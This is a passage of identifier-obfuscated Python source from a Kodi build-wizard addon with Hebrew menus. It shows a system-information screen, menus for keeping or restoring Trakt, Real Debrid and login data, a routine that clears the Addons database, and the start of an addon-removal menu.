	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O000OOOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2722
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000O0O0000000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2723
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO0O0OO0OO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2724
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2726
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O00000O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2727
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOO0OO0OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2728
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0O0OOOOOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2729
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O0OO0O00OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2730
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOO0O00000O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2731
	OO0OO0000000OOOOO =len (OOOO000OOOOOO00O0 )+len (O00O00000O0O0O00O )+len (OO0O0OOO000OO0OOO )+len (O0OOO0OOO00000O0O )+len (O0O00O000O0O0O00O )+len (O0O000O00OOO00OO0 )+len (OO0OOO0OO0OOOO0OO )#line:2733
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO0OO0000000OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2734
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0OOO000OO0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2735
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO0OOO00000O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2736
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O00000O0O0O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2737
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO000OOOOOO00O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2738
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OOO0OO0OOOO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2739
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O000O00OOO00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2740
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00O000O0O0O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2741
def Menu ():#line:2742
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2743
def saveMenu ():#line:2745
	OO00O00000O00O000 ='[COLOR green]מופעל[/COLOR]';OOOOO0OO0000000OO ='[COLOR red]מבוטל[/COLOR]'#line:2747
	O0OOO0000O0O00O00 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2748
	OOO00O0OO000O0000 ='true'if KEEPMOVIELIST =='true'else 'false'#line:2749
	O00OOOO0000O0O00O ='true'if KEEPINFO =='true'else 'false'#line:2750
	O0OO0O0OOOOOOOOOO ='true'if KEEPSOUND =='true'else 'false'#line:2752
	O0OO000OO0OO00000 ='true'if KEEPVIEW =='true'else 'false'#line:2753
	O0OO0O000OOO00OO0 ='true'if KEEPSKIN =='true'else 'false'#line:2754
	OOO00OOO0000OOOOO ='true'if KEEPSKIN2 =='true'else 'false'#line:2755
	OOO0O0O0O0000OO0O ='true'if KEEPSKIN3 =='true'else 'false'#line:2756
	O00O0OOOOOO000O0O ='true'if KEEPADDONS =='true'else 'false'#line:2757
	OO000OOO000O00OOO ='true'if KEEPPVR =='true'else 'false'#line:2758
	OOOOOO0OO0O0O0O0O ='true'if KEEPTVLIST =='true'else 'false'#line:2759
	OO00OO0OOO0O00OO0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2760
	OO0O00OOOOOOO0OO0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2761
	OO00O0OOOOOOOOO00 ='true'if KEEPHUBTV =='true'else 'false'#line:2762
	O0O00O00OOOOOO0O0 ='true'if KEEPHUBVOD =='true'else 'false'#line:2763
	OOOOO00OO00OOOOOO ='true'if KEEPHUBKIDS =='true'else 'false'#line:2764
	OO0OOOO00OOO00O0O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2765
	OOO000O0OO0OOO0O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:2766
	O0O0O0O000OOO00O0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:2767
	OO0O0O0O00O000OO0 ='true'if KEEPTRAKT =='true'else 'false'#line:2768
	O0OOO00OOO0O000OO ='true'if KEEPREAL =='true'else 'false'#line:2769
	O00O0OO00OO000OO0 ='true'if KEEPRD2 =='true'else 'false'#line:2770
	O00O00OO000OOO00O ='true'if KEEPTORNET =='true'else 'true'#line:2771
	O0OO0O00OO0O0OO00 ='true'if KEEPLOGIN =='true'else 'false'#line:2772
	OOO0O00OOO00O0OOO ='true'if KEEPSOURCES =='true'else 'false'#line:2773
	OO0OO0O0O00O0O0O0 ='true'if KEEPADVANCED =='true'else 'false'#line:2774
	OO00O0O0O0OOO0O0O ='true'if KEEPPROFILES =='true'else 'false'#line:2775
	O00000OOOO0OO0OOO ='true'if KEEPFAVS =='true'else 'false'#line:2776
	O0OOO00O00OO0O00O ='true'if KEEPREPOS =='true'else 'false'#line:2777
	O00O000OOO00O0OOO ='true'if KEEPSUPER =='true'else 'false'#line:2778
	O00O0O0OOO00OOOO0 ='true'if KEEPWHITELIST =='true'else 'false'#line:2779
	addFile ('אפשרויות','',themeit =THEME3 )#line:2783
	if O00O0O0OOO00OOOO0 =='true':#line:2784
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2785
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2786
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2787
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2788
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2789
	addFile ('%s התקנת קיר סרטים: '%O0OOO0000O0O00O00 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2791
	addFile ('%s שמירת חשבון RD: '%O0OOO00OOO0O000OO .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2792
	addFile ('%s שמירת חשבון טראקט: '%OO0O0O0O00O000OO0 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2793
	addFile ('%s שמירת מועדפים: '%O00000OOOO0OO0OOO .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2796
	addFile ('%s שמירת לקוח טלוויזיה: '%OO000OOO000O00OOO .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2797
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%OOOOOO0OO0O0O0O0O .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2798
	addFile ('%s שמירת אריח סרטים: '%OO00OO0OOO0O00OO0 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2799
	addFile ('%s שמירת אריח סדרות: '%OO0O00OOOOOOO0OO0 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2800
	addFile ('%s שמירת אריח טלויזיה: '%OO00O0OOOOOOOOO00 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2801
	addFile ('%s שמירת אריח תוכן ישראלי: '%O0O00O00OOOOOO0O0 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2802
	addFile ('%s שמירת אריח ילדים: '%OOOOO00OO00OOOOOO .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2803
	addFile ('%s שמירת אריח מוסיקה: '%OO0OOOO00OOO00O0O .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2804
	addFile ('%s שמירת תפריט אריחים ראשי: '%OOO000O0OO0OOO0O0 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2805
	addFile ('%s שמירת כל האריחים בסקין: '%O0OO0O000OOO00OO0 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2806
	addFile ('%s שמירת הרחבות שהתקנתי: '%O00O0OOOOOO000O0O .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2813
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%O00OOOO0000O0O00O .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2814
	addFile ('%s שמירת ספריית סרטים וסדרות: '%OOO00O0OO000O0000 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2817
	addFile ('%s שמירת מקורות וידאו: '%OOO0O00OOO00O0OOO .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2818
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%O0OO0O0OOOOOOOOOO .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2819
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%O0OO000OO0OO00000 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2821
	addFile ('%s שמירת פליליסט לאודר: '%O0O0O0O000OOO00O0 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2822
	addFile ('%s שמירת הרחבות ידנית: '%O00O0O0OOO00OOOO0 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2823
	addFile ('%s שמירת הגדרות באפר: '%OO0OO0O0O00O0O0O0 .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2827
	addFile ('%s שמירת סופר מועדפים: '%O00O000OOO00O0OOO .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2828
	addFile ('%s שמירת רשימות ריפו: '%O0OOO00O00OO0O00O .replace ('true',OO00O00000O00O000 ).replace ('false',OOOOO0OO0000000OO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2829
	setView ('files','viewType')#line:2831
def traktMenu ():#line:2833
	O000OO0OOOOOO0O0O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2834
	OOO0O000OOO0OO00O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2835
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2836
	addFile ('Save Trakt Data: %s'%O000OO0OOOOOO0O0O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2837
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOO0O000OOO0OO00O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2838
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2839
	for O000OO0OOOOOO0O0O in traktit .ORDER :#line:2841
		OO0OO00OOO00OO0O0 =TRAKTID [O000OO0OOOOOO0O0O ]['name']#line:2842
		O0O00O00OO0000OOO =TRAKTID [O000OO0OOOOOO0O0O ]['path']#line:2843
		O00OO00000OO0OOOO =TRAKTID [O000OO0OOOOOO0O0O ]['saved']#line:2844
		OO00OO000OOOO0OOO =TRAKTID [O000OO0OOOOOO0O0O ]['file']#line:2845
		O00000O0000000OO0 =wiz .getS (O00OO00000OO0OOOO )#line:2846
		OOO0OOOO0000O0O0O =traktit .traktUser (O000OO0OOOOOO0O0O )#line:2847
		O000O0OO0OOO0OOO0 =TRAKTID [O000OO0OOOOOO0O0O ]['icon']if os .path .exists (O0O00O00OO0000OOO )else ICONTRAKT #line:2848
		O00O0OO0OOO00O0OO =TRAKTID [O000OO0OOOOOO0O0O ]['fanart']if os .path .exists (O0O00O00OO0000OOO )else FANART #line:2849
		O00OO0OO0000O0O0O =createMenu ('saveaddon','Trakt',O000OO0OOOOOO0O0O )#line:2850
		OO0OO0O000000O0O0 =createMenu ('save','Trakt',O000OO0OOOOOO0O0O )#line:2851
		O00OO0OO0000O0O0O .append ((THEME2 %'%s Settings'%OO0OO00OOO00OO0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O000OO0OOOOOO0O0O )))#line:2852
		addFile ('[+]-> %s'%OO0OO00OOO00OO0O0 ,'',icon =O000O0OO0OOO0OOO0 ,fanart =O00O0OO0OOO00O0OO ,themeit =THEME3 )#line:2854
		if not os .path .exists (O0O00O00OO0000OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000O0OO0OOO0OOO0 ,fanart =O00O0OO0OOO00O0OO ,menu =O00OO0OO0000O0O0O )#line:2855
		elif not OOO0OOOO0000O0O0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O000OO0OOOOOO0O0O ,icon =O000O0OO0OOO0OOO0 ,fanart =O00O0OO0OOO00O0OO ,menu =O00OO0OO0000O0O0O )#line:2856
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0OOOO0000O0O0O ,'authtrakt',O000OO0OOOOOO0O0O ,icon =O000O0OO0OOO0OOO0 ,fanart =O00O0OO0OOO00O0OO ,menu =O00OO0OO0000O0O0O )#line:2857
		if O00000O0000000OO0 =="":#line:2858
			if os .path .exists (OO00OO000OOOO0OOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O000OO0OOOOOO0O0O ,icon =O000O0OO0OOO0OOO0 ,fanart =O00O0OO0OOO00O0OO ,menu =OO0OO0O000000O0O0 )#line:2859
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O000OO0OOOOOO0O0O ,icon =O000O0OO0OOO0OOO0 ,fanart =O00O0OO0OOO00O0OO ,menu =OO0OO0O000000O0O0 )#line:2860
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00000O0000000OO0 ,'',icon =O000O0OO0OOO0OOO0 ,fanart =O00O0OO0OOO00O0OO ,menu =OO0OO0O000000O0O0 )#line:2861
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2863
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2864
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2865
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2866
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2867
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2868
	setView ('files','viewType')#line:2869
def realMenu ():#line:2871
	OO0O0OO0000OOO0OO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2872
	OO0OOO00O0O0OO000 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2873
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2874
	addFile ('Save Real Debrid Data: %s'%OO0O0OO0000OOO0OO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2875
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO0OOO00O0O0OO000 ),'',icon =ICONREAL ,themeit =THEME3 )#line:2876
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2877
	for OOOOO00O0O0O00O00 in debridit .ORDER :#line:2879
		OOO0O000O0OO00OOO =DEBRIDID [OOOOO00O0O0O00O00 ]['name']#line:2880
		O00OO0O0O00O0O00O =DEBRIDID [OOOOO00O0O0O00O00 ]['path']#line:2881
		O000O0O000000OOOO =DEBRIDID [OOOOO00O0O0O00O00 ]['saved']#line:2882
		OOOOOOO00O0OOO000 =DEBRIDID [OOOOO00O0O0O00O00 ]['file']#line:2883
		OOOO00O000OO00OOO =wiz .getS (O000O0O000000OOOO )#line:2884
		OOOOO00OO000OO0OO =debridit .debridUser (OOOOO00O0O0O00O00 )#line:2885
		OO000O00OO00000O0 =DEBRIDID [OOOOO00O0O0O00O00 ]['icon']if os .path .exists (O00OO0O0O00O0O00O )else ICONREAL #line:2886
		OO00O00OO0OO00O0O =DEBRIDID [OOOOO00O0O0O00O00 ]['fanart']if os .path .exists (O00OO0O0O00O0O00O )else FANART #line:2887
		O0O0O0OOOOO0OOO00 =createMenu ('saveaddon','Debrid',OOOOO00O0O0O00O00 )#line:2888
		OOOO00O00O0OOO0OO =createMenu ('save','Debrid',OOOOO00O0O0O00O00 )#line:2889
		O0O0O0OOOOO0OOO00 .append ((THEME2 %'%s Settings'%OOO0O000O0OO00OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOOOO00O0O0O00O00 )))#line:2890
		addFile ('[+]-> %s'%OOO0O000O0OO00OOO ,'',icon =OO000O00OO00000O0 ,fanart =OO00O00OO0OO00O0O ,themeit =THEME3 )#line:2892
		if not os .path .exists (O00OO0O0O00O0O00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO000O00OO00000O0 ,fanart =OO00O00OO0OO00O0O ,menu =O0O0O0OOOOO0OOO00 )#line:2893
		elif not OOOOO00OO000OO0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOOOO00O0O0O00O00 ,icon =OO000O00OO00000O0 ,fanart =OO00O00OO0OO00O0O ,menu =O0O0O0OOOOO0OOO00 )#line:2894
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOO00OO000OO0OO ,'authdebrid',OOOOO00O0O0O00O00 ,icon =OO000O00OO00000O0 ,fanart =OO00O00OO0OO00O0O ,menu =O0O0O0OOOOO0OOO00 )#line:2895
		if OOOO00O000OO00OOO =="":#line:2896
			if os .path .exists (OOOOOOO00O0OOO000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOOOO00O0O0O00O00 ,icon =OO000O00OO00000O0 ,fanart =OO00O00OO0OO00O0O ,menu =OOOO00O00O0OOO0OO )#line:2897
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOOOO00O0O0O00O00 ,icon =OO000O00OO00000O0 ,fanart =OO00O00OO0OO00O0O ,menu =OOOO00O00O0OOO0OO )#line:2898
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOO00O000OO00OOO ,'',icon =OO000O00OO00000O0 ,fanart =OO00O00OO0OO00O0O ,menu =OOOO00O00O0OOO0OO )#line:2899
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2901
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2902
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2903
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2904
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2905
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2906
	setView ('files','viewType')#line:2907
def loginMenu ():#line:2909
	OOO0O00OOOOOO00OO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2910
	OOOO0OOOO0OO0O0O0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2911
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2912
	addFile ('Save Login Data: %s'%OOO0O00OOOOOO00OO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:2913
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOO0OOOO0OO0O0O0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2914
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2915
	for OOO0O00OOOOOO00OO in loginit .ORDER :#line:2917
		OOO0O00O0O0OO000O =LOGINID [OOO0O00OOOOOO00OO ]['name']#line:2918
		OO0O0O0O0O0OOOOO0 =LOGINID [OOO0O00OOOOOO00OO ]['path']#line:2919
		O000O0O0OO000OO00 =LOGINID [OOO0O00OOOOOO00OO ]['saved']#line:2920
		O00OOO000000OOOOO =LOGINID [OOO0O00OOOOOO00OO ]['file']#line:2921
		O0OO0O00OOO000OO0 =wiz .getS (O000O0O0OO000OO00 )#line:2922
		OO0O0OOOO00O0O000 =loginit .loginUser (OOO0O00OOOOOO00OO )#line:2923
		O0OO000OOOO0O000O =LOGINID [OOO0O00OOOOOO00OO ]['icon']if os .path .exists (OO0O0O0O0O0OOOOO0 )else ICONLOGIN #line:2924
		OO00000OOO0OO000O =LOGINID [OOO0O00OOOOOO00OO ]['fanart']if os .path .exists (OO0O0O0O0O0OOOOO0 )else FANART #line:2925
		O000O0OOOOO0000O0 =createMenu ('saveaddon','Login',OOO0O00OOOOOO00OO )#line:2926
		OOO0000OO00OOO0OO =createMenu ('save','Login',OOO0O00OOOOOO00OO )#line:2927
		O000O0OOOOO0000O0 .append ((THEME2 %'%s Settings'%OOO0O00O0O0OO000O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOO0O00OOOOOO00OO )))#line:2928
		addFile ('[+]-> %s'%OOO0O00O0O0OO000O ,'',icon =O0OO000OOOO0O000O ,fanart =OO00000OOO0OO000O ,themeit =THEME3 )#line:2930
		if not os .path .exists (OO0O0O0O0O0OOOOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OO000OOOO0O000O ,fanart =OO00000OOO0OO000O ,menu =O000O0OOOOO0000O0 )#line:2931
		elif not OO0O0OOOO00O0O000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOO0O00OOOOOO00OO ,icon =O0OO000OOOO0O000O ,fanart =OO00000OOO0OO000O ,menu =O000O0OOOOO0000O0 )#line:2932
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O0OOOO00O0O000 ,'authlogin',OOO0O00OOOOOO00OO ,icon =O0OO000OOOO0O000O ,fanart =OO00000OOO0OO000O ,menu =O000O0OOOOO0000O0 )#line:2933
		if O0OO0O00OOO000OO0 =="":#line:2934
			if os .path .exists (O00OOO000000OOOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOO0O00OOOOOO00OO ,icon =O0OO000OOOO0O000O ,fanart =OO00000OOO0OO000O ,menu =OOO0000OO00OOO0OO )#line:2935
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOO0O00OOOOOO00OO ,icon =O0OO000OOOO0O000O ,fanart =OO00000OOO0OO000O ,menu =OOO0000OO00OOO0OO )#line:2936
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OO0O00OOO000OO0 ,'',icon =O0OO000OOOO0O000O ,fanart =OO00000OOO0OO000O ,menu =OOO0000OO00OOO0OO )#line:2937
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2939
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2940
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2941
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2942
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2943
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2944
	setView ('files','viewType')#line:2945
def fixUpdate ():#line:2947
	if KODIV <17 :#line:2948
		O0OO000O0O0000000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:2949
		try :#line:2950
			os .remove (O0OO000O0O0000000 )#line:2951
		except Exception as O0OO00O0O0OO0O00O :#line:2952
			wiz .log ("Unable to remove %s, Purging DB"%O0OO000O0O0000000 )#line:2953
			wiz .purgeDb (O0OO000O0O0000000 )#line:2954
	else :#line:2955
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:2956
def removeAddonMenu ():#line:2958
	OOO00OO0O000OOOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2959
	O00000O0OO0O0O0OO =[];O0OOOOOO0O0O000O0 =[]#line:2960
	for OO0OO000O00000O00 in sorted (OOO00OO0O000OOOO0 ,key =lambda O0OOOO0OOO000OO0O :O0OOOO0OOO000OO0O ):#line:2961
		O0000000O00000OOO =os .path .split (OO0OO000O00000O00 [:-1 ])[1 ]#line:2962
		if O0000000O00000OOO in EXCLUDES :continue #line:2963
		elif O0000000O00000OOO in DEFAULTPLUGINS :continue #line:2964
		elif O0000000O00000OOO =='packages':continue #line:2965
		OO0OO00O0O0O00OO0 =os .path .join (OO0OO000O00000O00 ,'addon.xml')#line:2966
		if os .path .exists (OO0OO00O0O0O00OO0 ):#line:2967
			O0O00O00OOOO0O00O =open (OO0OO00O0O0O00OO0 )#line:2968
			O000OO0000O00O00O =O0O00O00OOOO0O00O .read ()#line:2969
			O00O0O0O0O0O0O0OO =wiz .parseDOM (O000OO0000O00O00O ,'addon',ret ='id')#line:2970
			OO00O0O0OO00OO0O0 =O0000000O00000OOO if len (O00O0O0O0O0O0O0OO )==0 else O00O0O0O0O0O0O0OO [0 ]#line:2972
			try :#line:2973
				OO0OO0O0O000O0OOO =xbmcaddon .Addon (id =OO00O0O0OO00OO0O0 )#line:2974
				O00000O0OO0O0O0OO .append (OO0OO0O0O000O0OOO .getAddonInfo ('name'))#line:2975
